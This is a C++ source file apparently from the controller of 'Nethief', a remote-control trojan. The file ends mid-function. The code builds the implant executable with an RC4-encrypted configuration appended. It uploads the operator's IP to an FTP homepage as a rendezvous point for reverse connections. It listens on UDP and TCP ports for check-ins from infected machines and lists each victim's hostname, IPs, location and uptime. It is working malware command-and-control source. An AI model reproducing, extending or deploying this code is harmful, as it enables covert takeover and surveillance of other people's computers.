//Download by http://www.NewXing.com
// Community.cpp: implementation of the CCommunity class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "Nethief.h"
#include "Community.h"

#include "SelectIPDlg.h"
#include "Md5.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif
//************参数设定*******************
#define CALLBOARD_TEXT_ADDRESS		"http://www.greenstuffsoft.net/nethief-callboard/Nethief_Callboard.dat"
#define NEW_VERSION_INFO_ADDRESS	"http://www.greenstuffsoft.net/nethief-callboard/Nethief_Version.dat"
#define NEW_DATE_INFO_ADDRESS		"http://www.greenstuffsoft.net/nethief-callboard/Nethief_Date.dat"
#define REFRESH_CHATROOM_ADDRESS	"http://chat.netsh.com/fcgi-bin/listmy.fcgi?port=9426"
//***************************************

CCommunity::CCommunity()
{
	m_pFtpConn=NULL;
	m_nOnlineNum=0;
	////////////////////////////////
	m_bIsRegistered=GetINIfileInt("FTP Server Setting","IsRegistered");

	m_nSubItem=GetINIfileInt("Main Window Placement","nSubItem");
	m_bAscending=GetINIfileInt("Main Window Placement","bAscending");
	////////////////////////////////
	m_strFtpServerAddress=GetINIfileString("FTP Server Setting","FtpServerAddress");	//FTP服务器的域名或IP地址
	m_strFtpUsername=GetINIfileString("FTP Server Setting","FtpUsername");		//主页空间的用户名
	m_strFtpPassword=GetINIfileString("FTP Server Setting","FtpPassword");		//主页空间的密码
	m_strHomepage=GetINIfileString("FTP Server Setting","Homepage");		//主页空间的网址

	m_strFileSavePath=GetINIfileString("FTP Server Setting","FileSavePath");		//FTP服务器上存放数据文件的目录
	m_strNotifyFilename=GetINIfileString("FTP Server Setting","NotifyFilename");
	m_strConnectFilename=GetINIfileString("FTP Server Setting","ConnectFilename");
	m_strClientFilename=GetINIfileString("FTP Server Setting","ClientFilename");
	m_strDownloadFilename=GetINIfileString("FTP Server Setting","DownloadFilename");
	m_strDataPassword=GetINIfileString("FTP Server Setting","DataPassword");		//数据加密密钥
	////////////////////////////////
	CString strHomepage,strFileSavePath;
	if(m_strHomepage.Right(1)=="/")
		strHomepage=m_strHomepage.Left(m_strHomepage.GetLength()-1);
	else
		strHomepage=m_strHomepage;
	if(m_strFileSavePath.Right(1)!="/")
		strFileSavePath=m_strFileSavePath+"/";
	else
		strFileSavePath=m_strFileSavePath;
	strFileSavePath=strFileSavePath.Mid(1,strFileSavePath.GetLength()-1);
	CString strHttpDirName=strHomepage+strFileSavePath;

	CString strNotifyInfoURL=strHttpDirName+m_strNotifyFilename;

	CMd5 Md5;
	Md5.GetMD5CheckSum((BYTE*)strNotifyInfoURL.GetBuffer(strNotifyInfoURL.GetLength()),
		strNotifyInfoURL.GetLength(),m_byCheckSum_NotifyPack);
	////////////////////////////////
	gethostname(m_cHostname,128);
	////////////////////////////////
	m_IPToLocal.LoadIPAddress(GetCurDir()+"IPAddress.dat");
}

CCommunity::~CCommunity()
{
	if(m_pFtpConn!=NULL)
		m_pFtpConn->Close();
	m_Session.Close();

	WriteINIfileInt("Main Window Placement","nSubItem",m_nSubItem);
	WriteINIfileInt("Main Window Placement","bAscending",m_bAscending);
}

void CCommunity::SetFtpServerInfo(int nControlCode,
				CString strAddress,CString strUsername,CString strPassword,CString strHomepage,
				CString strPath,CString strNotifyFilename,CString strConnectFilename,CString strClientFilename,
				CString strDownloadFilename,
				CString strDataPassword)
{
	switch(nControlCode)
	{
		case 0:
		{
			WriteINIfileString("FTP Server Setting","FtpServerAddress",strAddress);
			WriteINIfileString("FTP Server Setting","FtpUsername",strUsername);
			WriteINIfileString("FTP Server Setting","FtpPassword",strPassword);
			WriteINIfileString("FTP Server Setting","Homepage",strHomepage);

			m_strFtpServerAddress=strAddress;	//FTP服务器的域名或IP地址
			m_strFtpUsername=strUsername;		//主页空间的用户名
			m_strFtpPassword=strPassword;		//主页空间的密码
			m_strHomepage=strHomepage;			//主页空间的网址
			break;
		}
		case 1:
		{
			WriteINIfileString("FTP Server Setting","FileSavePath",strPath);
			WriteINIfileString("FTP Server Setting","NotifyFilename",strNotifyFilename);
			WriteINIfileString("FTP Server Setting","ConnectFilename",strConnectFilename);
			WriteINIfileString("FTP Server Setting","ClientFilename",strClientFilename);
			
			m_strFileSavePath=strPath;		//FTP服务器上存放数据文件的目录
			m_strNotifyFilename=strNotifyFilename;
			m_strConnectFilename=strConnectFilename;
			m_strClientFilename=strClientFilename;
			break;
		}
		case 2:
		{
			WriteINIfileString("FTP Server Setting","DownloadFilename",strDownloadFilename);
			
			m_strDownloadFilename=strDownloadFilename;
			break;
		}
		case 3:
		{
			WriteINIfileString("FTP Server Setting","DataPassword",strDataPassword);
			
			m_strDataPassword=strDataPassword;	//数据加密密钥
			break;
		}
		case 4:
		{
			////////////////////////////////
			CString strHomepage,strFileSavePath;
			if(m_strHomepage.Right(1)=="/")
				strHomepage=m_strHomepage.Left(m_strHomepage.GetLength()-1);
			else
				strHomepage=m_strHomepage;
			if(m_strFileSavePath.Right(1)!="/")
				strFileSavePath=m_strFileSavePath+"/";
			else
				strFileSavePath=m_strFileSavePath;
			strFileSavePath=strFileSavePath.Mid(1,strFileSavePath.GetLength()-1);
			CString strHttpDirName=strHomepage+strFileSavePath;

			CString strNotifyInfoURL=strHttpDirName+m_strNotifyFilename;

			CMd5 Md5;
			Md5.GetMD5CheckSum((BYTE*)strNotifyInfoURL.GetBuffer(strNotifyInfoURL.GetLength()),
				strNotifyInfoURL.GetLength(),m_byCheckSum_NotifyPack);
			////////////////////////////////
			m_bIsRegistered=TRUE;
			WriteINIfileInt("FTP Server Setting","IsRegistered",m_bIsRegistered);
			break;
		}
	}
}

BOOL CCommunity::IsOnline()
{
	hostent* hn;
	hn = gethostbyname(m_cHostname);
	CString strIPAddr;
	for(int j=0;hn->h_addr_list[j]!=NULL;j++)
		strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[j]);
	if(strIPAddr!="127.0.0.1")
		return TRUE;
	else
		return FALSE;
}

BOOL CCommunity::BuildServer(CString strKeyName,CString strFilename,
							 CString strNote,CString strServerFilename)
{
	CString strBuf;
	DWORD dwBuild1Length;
	////////////////////////////////////////////////////////
	CString strBuild1Filename=GetCurDir()+"Server.bud";
	//判断Server.bud文件是否存在///////
	CFileFind f;
	BOOL bExist=f.FindFile(strBuild1Filename);
	if(!bExist)//如果文件不存在
	{
		AfxGetMainWnd()->MessageBox(FILENOTFOUND_TEXT,FILENOTFOUND_CAPTION,
			MB_ICONSTOP|MB_OK);
		return FALSE;
	}
	///////////////////////////////////
	BYTE byCheckSum[16];

	CFile Build1File(strBuild1Filename,
		CFile::modeRead|CFile::shareDenyNone);
	dwBuild1Length=Build1File.GetLength()-sizeof(byCheckSum);
	Build1File.Read(strBuf.GetBufferSetLength(dwBuild1Length),
		dwBuild1Length);

	Build1File.Read(byCheckSum,sizeof(byCheckSum));
	EncryptData(byCheckSum,sizeof(byCheckSum),PUBLICPASSWORD);//MD5校验和解密

	Build1File.Close();  //关闭文件
	////////////////////////////////////////////////////////
	CFile ServerFile(strServerFilename,
		CFile::modeCreate|CFile::modeWrite|CFile::shareDenyNone);
	ServerFile.Write(strBuf.GetBuffer(dwBuild1Length),
		dwBuild1Length);
	////////////////////////////////
	CString strHomepage,strFileSavePath;
	if(m_strHomepage.Right(1)=="/")
		strHomepage=m_strHomepage.Left(m_strHomepage.GetLength()-1);
	else
		strHomepage=m_strHomepage;
	if(m_strFileSavePath.Right(1)!="/")
		strFileSavePath=m_strFileSavePath+"/";
	else
		strFileSavePath=m_strFileSavePath;
	strFileSavePath=strFileSavePath.Mid(1,strFileSavePath.GetLength()-1);
	CString strHttpDirName=strHomepage+strFileSavePath;

	SERVER_CONFIG stServerConfig;
	ZeroMemory(&stServerConfig,sizeof(stServerConfig));
	CStringToChar(stServerConfig.cHttpDirName,strHttpDirName);
	CStringToChar(stServerConfig.cNotifyFilename,m_strNotifyFilename);
	CStringToChar(stServerConfig.cConnectFilename,m_strConnectFilename);
	CStringToChar(stServerConfig.cDownloadFilename,m_strDownloadFilename);
	CStringToChar(stServerConfig.cKeyName,strKeyName);
	CStringToChar(stServerConfig.cFilename,strFilename);
	CStringToChar(stServerConfig.cNote,strNote);
	memcpy(stServerConfig.byCheckSum,byCheckSum,sizeof(byCheckSum));

	EncryptData(&stServerConfig,sizeof(stServerConfig)-sizeof(stServerConfig.cDataPassword),m_strDataPassword);

	CStringToChar(stServerConfig.cDataPassword,m_strDataPassword);

	EncryptData(&stServerConfig,sizeof(stServerConfig),PUBLICPASSWORD);
	////////////////////////////////
	ServerFile.Write(&stServerConfig,sizeof(stServerConfig));
	ServerFile.Close();  //关闭文件

	return TRUE;
}

int CCommunity::ConnectFtpServer(CWnd* pWnd)
{
	CString strIPAddr;
#if ONLINE_TEST
	if(!IsOnline())
		return 0;
	////////////////////////////////////////////
	m_CriticalSection.Lock();
	TRY
	{
		m_pFtpConn=m_Session.GetFtpConnection(m_strFtpServerAddress,m_strFtpUsername,m_strFtpPassword,21);
	}
	CATCH_ALL(e)
	{
		m_CriticalSection.Unlock();
		return 2;//无法连接神偷服务器
	}
	END_CATCH_ALL
	if(!m_pFtpConn->SetCurrentDirectory("./wwwroot"))
	{
		if(!m_pFtpConn->SetCurrentDirectory("./www"))
		{
			if(!m_pFtpConn->SetCurrentDirectory("./html"))
			{
				if(!m_pFtpConn->SetCurrentDirectory("./public_html"))
				{
				}
			}
		}
	}
	//////////////循环调用创建多级子目录////////////////
	if(!m_pFtpConn->SetCurrentDirectory(m_strFileSavePath))
	{
		CString strDirName=m_strFileSavePath;
		if(strDirName.GetAt(strDirName.GetLength()-1)!='/')
			strDirName+="/";
		CString strTemp=strDirName;
		while(1)
		{
			int nCount=strTemp.Find("/");
			if(nCount!=-1)
			{
				CString strDir=strDirName.Mid(0,nCount+1);
				m_pFtpConn->CreateDirectory(strDir);
				strTemp.SetAt(nCount,'|');
			}
			else
				break;
		}
		if(!m_pFtpConn->SetCurrentDirectory(m_strFileSavePath))
		{
			m_CriticalSection.Unlock();
			return 2;
		}
	}
#endif
	//////////////////////////////////////////////////////
	ShowSelectIPDialog();
	strIPAddr=GetBindIP();
	//////////////////////////////////////////////////////
#if ONLINE_TEST
	IN_ADDR localaddr;
	localaddr.s_addr=inet_addr(strIPAddr);
	EncryptData(&localaddr,sizeof(localaddr),m_strDataPassword);
	CInternetFile* pInternetFile=m_pFtpConn->OpenFile(m_strNotifyFilename,GENERIC_WRITE);
	pInternetFile->Write(&localaddr,sizeof(localaddr));
	pInternetFile->Close();

	m_CriticalSection.Unlock();
#endif
	////////////////////////////////////////////
	m_strIPAddr=strIPAddr;//客户端的IP地址
	m_strPosition=m_IPToLocal.GetIPAddressLocal(m_strIPAddr);//客户端的地理位置
	m_strHostName=RegReadValue(HKEY_LOCAL_MACHINE,
		"System\\CurrentControlSet\\control\\ComputerName\\ComputerName","ComputerName");
	//准备接收UDP上线通知//////////////////////////////////
	closesocket(m_hNotifySocket);
	m_hNotifySocket=socket(AF_INET,SOCK_DGRAM,0);
	if(m_hNotifySocket==INVALID_SOCKET)
		AfxMessageBox("socket() failed");

	SOCKADDR_IN localsockaddr;
	localsockaddr.sin_family=AF_INET;
	localsockaddr.sin_port=htons(60000);//监听UDP 60000
	localsockaddr.sin_addr.s_addr=inet_addr(strIPAddr);

	int nRet=bind(m_hNotifySocket,(SOCKADDR*)&localsockaddr,sizeof(localsockaddr));
	if(nRet==SOCKET_ERROR)
		AfxMessageBox("bind() failed");
	WSAAsyncSelect(m_hNotifySocket,pWnd->m_hWnd,WM_SOCKET,FD_READ);
	//准备接收TCP上线通知//////////////////////////////////
	closesocket(m_hListenSocket);
	m_hListenSocket=socket(AF_INET,SOCK_STREAM,0);
	if(m_hListenSocket==INVALID_SOCKET)
		AfxMessageBox("socket() failed");

	localsockaddr.sin_port=htons(60001);//监听TCP 60001
	nRet=bind(m_hListenSocket,(SOCKADDR*)&localsockaddr,sizeof(localsockaddr));
	if(nRet==SOCKET_ERROR)
		AfxMessageBox("bind() failed");
	if(listen(m_hListenSocket,SOMAXCONN)==SOCKET_ERROR)//监听连接最大化
		AfxMessageBox("listen() failed");
	//注册FD_ACCEPT事件
	WSAAsyncSelect(m_hListenSocket,pWnd->m_hWnd,WM_SOCKET,FD_ACCEPT);
	////////////////////////////////////////////////////////
	return 3;
}

BOOL CCommunity::KeepFtpSession()
{
#if ONLINE_TEST
	m_CriticalSection.Lock();
	DWORD dwTemp;
	TRY
	{
		CInternetFile* pInternetFile=m_pFtpConn->OpenFile(m_strClientFilename,GENERIC_WRITE);
		pInternetFile->Write(&dwTemp,sizeof(dwTemp));
		pInternetFile->Close();
	}
	CATCH_ALL(e)
	{
		if(m_pFtpConn!=NULL)
		{
			m_pFtpConn->Close();
			m_pFtpConn=NULL;
		}

		m_CriticalSection.Unlock();
		return FALSE;//无法连接神偷服务器
	}
	END_CATCH_ALL

	m_CriticalSection.Unlock();
#endif
	return TRUE;
}

BOOL CCommunity::RecvNotify(SOCKET hSocket,CListCtrl* pList,CMapStringToString* pHostRemarkMap)
{
	SERVER_INFO stServerInfo;
	SOCKADDR_IN clientsockaddr;
	int nLen=sizeof(clientsockaddr);
	BOOL bIsTcpNotify;

	if(hSocket!=m_hNotifySocket)//接收到的不是UDP上线通知包,即是HTTP隧道技术上线通知
	{
		bIsTcpNotify=TRUE;

		//接收POST请求,可能是只有一行头、HTTP头或HTTP头+数据
		BYTE byBuffer[1024];
		ZeroMemory(byBuffer,sizeof(byBuffer));

		int nRet=recv(hSocket,(char*)&byBuffer,sizeof(byBuffer),NULL);
		if(nRet==SOCKET_ERROR)//Socket出错了
		{
			closesocket(hSocket);//关闭接收Socket
			return FALSE;
		}

		if(byBuffer[nRet-2]==0x0D && byBuffer[nRet-1]==0x0A)
		{
			return FALSE;//接收到的只有HTTP头或者只有一行头,返回
		}
		//////////////////////////////////////////
		getpeername(hSocket,(SOCKADDR*)&clientsockaddr,&nLen);//得到对方的IP地址及端口

		memcpy(&stServerInfo,&byBuffer[nRet-sizeof(stServerInfo)],sizeof(stServerInfo));
		//////////////////////////////////////////
		closesocket(hSocket);//关闭接收Socket
	}
	else
	{
		bIsTcpNotify=FALSE;

		int nRet=recvfrom(m_hNotifySocket,(char*)&stServerInfo,sizeof(stServerInfo),NULL,(SOCKADDR*)&clientsockaddr,&nLen);
		if(nRet==SOCKET_ERROR)
		{
			return FALSE;
		}
	}
	/////////////////////////////////////////////////////////////////////
#if ONLINE_TEST
	//比较服务端上线通知包的MD5校验和
	int nRet=memcmp(m_byCheckSum_NotifyPack,stServerInfo.byCheckSum,sizeof(m_byCheckSum_NotifyPack));
	if(nRet!=0)//不是本客户端的服务端发来的,直接返回不显示它
		return FALSE;
#endif
	CString strHostName=CharToCString(stServerInfo.cHostName,sizeof(stServerInfo.cHostName));

	IN_ADDR clientaddr;
	memcpy(&clientaddr,stServerInfo.cIPAddress,sizeof(stServerInfo.cIPAddress));
	CString strLanIP=(LPCSTR)inet_ntoa(clientaddr);

	CTimeSpan tsTimeSpan(0,0,stServerInfo.lTotalMinutes,0);
	CTime tmOnlineTime=CTime::GetCurrentTime()-tsTimeSpan;
	CString strTimeSpan;
	strTimeSpan.Format("%d-%02d:%02d",tsTimeSpan.GetDays(),tsTimeSpan.GetHours(),tsTimeSpan.GetMinutes());

	CString strInternetIP=(LPCSTR)inet_ntoa(clientsockaddr.sin_addr);
	if(strInternetIP==strLanIP)
		strLanIP="       -";

	CString strHostRemark="";//默认备注为空
	pHostRemarkMap->Lookup(strHostName,strHostRemark);//在映射中查找备注

	CString strPosition=m_IPToLocal.GetIPAddressLocal(strInternetIP);
	m_CriticalSection_List.Lock();
	/////////////////////////////////////////////////////////////////////
	BOOL bRefresh=FALSE;
	LV_FINDINFO fi;
	fi.flags=LVFI_STRING;
	fi.psz=strHostName;
	int nItem=pList->FindItem(&fi,-1);
	if(nItem==-1)
	{
		pList->SetRedraw(FALSE);
		nItem=pList->InsertItem(pList->GetItemCount(),strHostName,bIsTcpNotify);
		bRefresh=TRUE;
	}
	pList->SetItemText(nItem,1,strInternetIP);
	pList->SetItemText(nItem,2,strLanIP);
	pList->SetItemText(nItem,3,strPosition);
	pList->SetItemText(nItem,4,tmOnlineTime.Format("%m-%d %H:%M"));
	pList->SetItemText(nItem,5,strTimeSpan);
	pList->SetItemText(nItem,6,strHostRemark);
	/////////////////////////////////////////////////////////////////////
	if(bRefresh)
	{
		m_nOnlineNum=pList->GetItemCount();

		m_bAscending=!m_bAscending;
		SortItems(pList,m_nSubItem);
		pList->SetRedraw(TRUE);
	}
	m_CriticalSection_List.Unlock();
	return bRefresh;
}

BOOL CCommunity::AcceptTcpConnect(CWnd* pWnd)
{
	SOCKET hSocket=accept(m_hListenSocket,NULL,NULL);
	if(hSocket==INVALID_SOCKET)
		AfxMessageBox("accept() failed");
	//注册FD_READ事件
	WSAAsyncSelect(hSocket,pWnd->m_hWnd,WM_SOCKET,FD_READ);
	return TRUE;
}

BOOL CCommunity::ListRefresh(CListCtrl* pList)
{
#if ONLINE_TEST
	if(!IsOnline())
		return FALSE;
#endif
	m_CriticalSection_List.Lock();
	//////////////////////////////////////////////////
	BOOL bRefresh=FALSE;
	pList->SetRedraw(FALSE);
	int nCount=pList->GetItemCount();
	for(int i=nCount-1;i>=0;i--)
	{
		CTime tmCurrentTime=CTime::GetCurrentTime();

		CString strOnlineTime=pList->GetItemText(i,4);
		CTime tmOnlineTime(tmCurrentTime.GetYear(),atoi(strOnlineTime.Mid(0,2)),
			atoi(strOnlineTime.Mid(3,2)),atoi(strOnlineTime.Mid(6,2)),
			atoi(strOnlineTime.Mid(9,2)),0);

		CString strTimeSpan=pList->GetItemText(i,5);
		CTimeSpan tsTimeSpan(atoi(strTimeSpan.Mid(0,strTimeSpan.GetLength()-6)),
			atoi(strTimeSpan.Right(5).Left(2)),
			atoi(strTimeSpan.Right(2)),
			0);

		tsTimeSpan=tmCurrentTime-(tmOnlineTime+tsTimeSpan);
		if(tsTimeSpan.GetTotalMinutes()>2)
		{
			pList->DeleteItem(i);
			bRefresh=TRUE;
		}
	}
	if(bRefresh)
	{
		m_nOnlineNum=pList->GetItemCount();
	}
	pList->SetRedraw(TRUE);
	//////////////////////////////////////////////////
	m_CriticalSection_List.Unlock();
	return bRefresh;
}

////////////////////////////////////////////////////////////////////////////
void CCommunity::SortItems(CListCtrl* pList,int nSubItem)
{
	int nCount=pList->GetItemCount();
	for(int i=0;i<nCount;i++)
	{
		pList->SetItemData(i,i);
	}

	if(nSubItem==m_nSubItem)
	{
		m_bAscending=!m_bAscending;
	}
	else
	{
		m_nSubItem=nSubItem;
		m_bAscending=TRUE;
	}

	pSORT_ITEMS pstSortItems=new SORT_ITEMS;
	pstSortItems->pList=pList;
	pstSortItems->nSubItem=nSubItem;
	pstSortItems->bAscending=m_bAscending;

	pList->SortItems(CompareFunc,(LPARAM)pstSortItems);//列表项排序
	delete pstSortItems;
}

BOOL CCommunity::GetCallboardText(CEdit* pEdit_Callboard)
{
	if(!IsOnline())
		return FALSE;

	CString strBuf;
	TRY
	{
		CInternetSession Session;
		CHttpFile* pHttpFile=(CHttpFile*)Session.OpenURL(CALLBOARD_TEXT_ADDRESS);
		char Buffer[16];
		DWORD dwBufferLength=16;
		pHttpFile->QueryInfo(HTTP_QUERY_CONTENT_LENGTH,Buffer,&dwBufferLength,NULL);
		DWORD dwFileLength=atol(Buffer);
		pHttpFile->Read(strBuf.GetBufferSetLength(dwFileLength),dwFileLength);
		pHttpFile->Close();
		Session.Close();
	}
	CATCH_ALL(e)
	{
		return FALSE;
	}
	END_CATCH_ALL

	strBuf.ReleaseBuffer();
	pEdit_Callboard->SetWindowText(strBuf);

	return TRUE;
}

int CCommunity::RefreshChatroom()
{
	if(!IsOnline())
		return -1;

	CString strFileData;
	TRY
	{
		CInternetSession Session;
		CHttpFile* pHttpFile=(CHttpFile*)Session.OpenURL(REFRESH_CHATROOM_ADDRESS,
			NULL,INTERNET_FLAG_TRANSFER_BINARY|INTERNET_FLAG_RELOAD|INTERNET_FLAG_DONT_CACHE);
		while(1)
		{
			CString strBuf;
			int nRet=pHttpFile->Read(strBuf.GetBufferSetLength(1024),1024);
			if(nRet==0)//连接断开,说明已经全部传送完毕
				break;
			strBuf.ReleaseBuffer(nRet);
			strFileData+=strBuf;
		}
		pHttpFile->Close();
		Session.Close();
	}
	CATCH_ALL(e)
	{
		return -1;
	}
	END_CATCH_ALL
	//////////////////////////////////////////////////
	CString strFindString="聊天室现有";
	CString strFindString2="人";
	int nFindStringLength=strFindString.GetLength();

	int nPos=strFileData.Find(strFindString);
	if(nPos!=-1)//等于-1是没找到,出错了,直接返回
	{
		int nPos1=strFileData.Find(strFindString2,nPos);
		int nNumberLength=nPos1-nPos-nFindStringLength;
		CString strChatroomNum=strFileData.Mid(nPos+nFindStringLength,nNumberLength);
		int nChatroomNum=atoi(strChatroomNum);
		return nChatroomNum;
	}

	return -1;
}

void CCommunity::GetNewVersionDateInfo(CString* strNewVersion,CString* strNewDate)
{
	*strNewVersion="<未知>";
	*strNewDate="<未知>";

	if(!IsOnline())
		return;

	TRY
	{
		CInternetSession Session;
		CInternetFile* pInternetFile=(CInternetFile*)Session.OpenURL(NEW_VERSION_INFO_ADDRESS);
		DWORD dwFileLength=pInternetFile->GetLength();
		pInternetFile->Read(strNewVersion->GetBufferSetLength(dwFileLength),dwFileLength);
		pInternetFile->Close();

		pInternetFile=(CInternetFile*)Session.OpenURL(NEW_DATE_INFO_ADDRESS);
		dwFileLength=pInternetFile->GetLength();
		pInternetFile->Read(strNewDate->GetBufferSetLength(dwFileLength),dwFileLength);
		pInternetFile->Close();
		Session.Close();
	}
	CATCH_ALL(e)
	{
		return;
	}
	END_CATCH_ALL

	strNewVersion->ReleaseBuffer();
	strNewDate->ReleaseBuffer();

	return;
}

void CCommunity::LogonCurrentSetting()
{
	WriteINIfileInt("FTP Server Setting","IsRegistered",FALSE);

	WriteINIfileString("FTP Server Setting","FtpServerAddress","");
	WriteINIfileString("FTP Server Setting","FtpUsername","");
	WriteINIfileString("FTP Server Setting","FtpPassword","");
	WriteINIfileString("FTP Server Setting","Homepage","");
	WriteINIfileString("FTP Server Setting","FileSavePath","");
	WriteINIfileString("FTP Server Setting","NotifyFilename","");
	WriteINIfileString("FTP Server Setting","ConnectFilename","");
	WriteINIfileString("FTP Server Setting","ClientFilename","");
	WriteINIfileString("FTP Server Setting","DownloadFilename","");
	WriteINIfileString("FTP Server Setting","DataPassword","");
}

CString	CCommunity::GetBindIP()
{
	CStringArray aryIPAddrList;

	hostent* hn;
	hn = gethostbyname(m_cHostname);
	CString strIPAddr;
	for(int j=0;hn->h_addr_list[j]!=NULL;j++)
	{
		strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[j]);
		aryIPAddrList.Add(strIPAddr);
	}
	/////////////////////////////////
	int nCount=aryIPAddrList.GetSize();
	if(nCount==1)//只有一个IP地址
		return aryIPAddrList[0];

	//返回指定的IP地址
	CString strBindIP=GetINIfileString("Client Setting","BindIP");
	for(int i=0;i<nCount;i++)
	{
		if(aryIPAddrList[i]==strBindIP)
			return aryIPAddrList[i];
	}

	//返回与指定IP地址枚举顺序相同的IP地址
	int nEnumOrder=GetINIfileInt("Client Setting","EnumOrder");
	if(nEnumOrder>nCount-1)
		nEnumOrder=nCount-1;
	return aryIPAddrList[nEnumOrder];
}

//////private///////////////////////////////////////////////
void CCommunity::CStringToChar(char* cText,CString strText)
{
	UINT nSize=strText.GetLength();
	memcpy(cText,strText.GetBuffer(nSize),nSize);
}

CString CCommunity::CharToCString(char* cText,UINT nSize)
{
	CString strText;
	memcpy(strText.GetBuffer(nSize),cText,nSize);
	strText.ReleaseBuffer();
	return strText;
}

CString CCommunity::RegReadValue(HKEY hKey,CString sKey,CString sChildKey)
{
	DWORD dwBufferSize=255;
	CString strResult;
	HKEY hChildKey;
	if(ERROR_SUCCESS!=RegOpenKeyEx(hKey,sKey,0,KEY_READ,&hChildKey))
	{
		return ""; //打开子键
	}
	BYTE * szBuff;
	szBuff = new BYTE[ dwBufferSize ];

	if(ERROR_SUCCESS!=RegQueryValueEx(hChildKey,sChildKey,0,0,
		&szBuff[0],&dwBufferSize))
	{
		return ""; //读键值
	}
	strResult = (CString)szBuff;
	delete[] szBuff;
	RegCloseKey(hChildKey);
	return strResult;
}

void CCommunity::EncryptData(LPVOID pVoid,DWORD dwBufLen,CString strKey)
{
	////////////////////////////////////////////////////////
	rc4_key key;
	int nKeyLen=strKey.GetLength();

	prepare_key((unsigned char*)strKey.GetBuffer(nKeyLen),nKeyLen,&key);
	rc4((unsigned char*)pVoid,dwBufLen,&key);
}

void CCommunity::prepare_key(unsigned char *key_data_ptr, int key_data_len, rc4_key *key)
{
	unsigned char t;
	unsigned char index1;
	unsigned char index2;
	unsigned char* state;
	short counter;

	state = &key->state[0];
	for(counter = 0; counter < 256; counter++)
		state[counter] =(unsigned char)counter;
	key->x = 0;
	key->y = 0;
	index1 = 0;
	index2 = 0;
	for(counter = 0; counter < 256; counter++)
	{
		index2 = (key_data_ptr[index1] + state[counter] + index2) % 256;
		swap_byte(&state[counter], &state[index2]);
		index1 = (index1 + 1) % key_data_len;
	}
}

void CCommunity::rc4(unsigned char *buffer_ptr, DWORD buffer_len, rc4_key *key)
{
	unsigned char t;
	unsigned char x;
	unsigned char y;
	unsigned char* state;
	unsigned char xorIndex;
	DWORD counter;

	x = key->x;
	y = key->y;
	state = &key->state[0];
	for(counter = 0; counter < buffer_len; counter++)
	{
		x = (x + 1) % 256;
		y = (state[x] + y) % 256;
		swap_byte(&state[x], &state[y]);
		xorIndex = (state[x] + state[y]) % 256;
		buffer_ptr[counter] ^= state[xorIndex];
	}
	key->x = x;
	key->y = y;
}

CString	CCommunity::GetCurDir()
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('\\')+1);  //找到
	exeFullPath.ReleaseBuffer();
	return exeFullPath;
}

int CALLBACK CCommunity::CompareFunc(LPARAM lParam1,LPARAM lParam2,LPARAM lParamSort)
{
	pSORT_ITEMS pstSortItems=(pSORT_ITEMS)lParamSort;
	CListCtrl* pList=pstSortItems->pList;
	int nSubItem=pstSortItems->nSubItem;
	BOOL bAscending=pstSortItems->bAscending;
	/////////////////////////////////////////
	int nItem1=-1;
	int nItem2=-1;
	if(pList->GetItemText(lParam1,2)=="       -")
		nItem1=1;
	if(pList->GetItemText(lParam2,2)=="       -")
		nItem2=1;
	if(nItem1!=nItem2)
	{
		return nItem2;
	}
	else
	{
		CString	strItem1 = pList->GetItemText(lParam1,nSubItem);
		CString	strItem2 = pList->GetItemText(lParam2,nSubItem);
		strItem1.MakeUpper();
		strItem2.MakeUpper();
		int nReturn=strcmp(strItem1,strItem2);
		if(bAscending)
			return nReturn;
		else
			return -nReturn;
	}
}

void CCommunity::ShowSelectIPDialog()
{
	CStringArray aryIPAddrList;

	hostent* hn;
	hn = gethostbyname(m_cHostname);
	CString strIPAddr;
	for(int j=0;hn->h_addr_list[j]!=NULL;j++)
	{
		strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[j]);
		aryIPAddrList.Add(strIPAddr);
	}
	int nCount=aryIPAddrList.GetSize();
	if(nCount==1)//只有一个IP地址
		return;
	if(!GetINIfileInt("Client Setting","IsSelectIP"))
		return;//不提示选择IP地址
	/////////////////////////////////
	CSelectIPDlg dlg;
	for(int i=0;i<nCount;i++)
	{
		dlg.m_aryIPAddrList.Add(aryIPAddrList[i]);
	}
	dlg.DoModal();
	if(dlg.m_nCombo==-1)
		dlg.m_nCombo=0;
	/////////////////////////////////
	WriteINIfileInt("Client Setting","IsSelectIP",FALSE);
	WriteINIfileInt("Client Setting","EnumOrder",dlg.m_nCombo);
	WriteINIfileString("Client Setting","BindIP",aryIPAddrList[dlg.m_nCombo]);
}

void CCommunity::ShowEditText(CEdit* pEdit_Test,CString strText)
{
	CString strNewText;
	pEdit_Test->GetWindowText(strNewText);
	strNewText=strNewText+strText+"\r\n";
	pEdit_Test->SetWindowText(strNewText);
}

//////////////////////////////////////////////////
int CCommunity::GetINIfileInt(LPCTSTR lpSectionName, LPCTSTR lpKeyName)
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('.'));  //找到
	exeFullPath=exeFullPath+".INI";  //源文件名
	return GetPrivateProfileInt(lpSectionName,lpKeyName,-1,
		exeFullPath.GetBufferSetLength(MAX_PATH));
}

BOOL CCommunity::WriteINIfileInt(LPCTSTR lpSectionName, LPCTSTR lpKeyName, INT nValue)
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('.'));  //找到
	exeFullPath=exeFullPath+".INI";  //源文件名
	CString strValue;               
	strValue.Format("%d",nValue);   //把整型转换成字符型
	return WritePrivateProfileString(lpSectionName,lpKeyName,
		strValue.GetBufferSetLength(strValue.GetLength()),
		exeFullPath.GetBufferSetLength(MAX_PATH));
}

CString CCommunity::GetINIfileString(LPCTSTR lpSectionName, LPCTSTR lpKeyName)
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,	 //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
